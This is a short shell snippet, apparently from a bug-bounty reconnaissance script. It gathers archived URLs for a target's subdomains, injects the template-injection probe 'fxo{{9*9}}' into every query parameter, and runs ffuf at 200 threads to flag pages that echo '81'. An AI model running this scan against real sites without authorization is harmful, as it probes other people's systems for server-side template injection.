# ffuf is more faster than httpx to be implemented to match regex and gf patterns for ssti can be also used :'(
./inputter.sh $1 initial_subdomains | httpx -silent | waybackurls | grep "=" | qsreplace "fxo{{9*9}}" >> result.txt ; ffuf -w result.txt -u FUZZ -mr "fxo81" -t 200 | ./outputter.sh $1 "/initial_ssti"; rm result.txt;
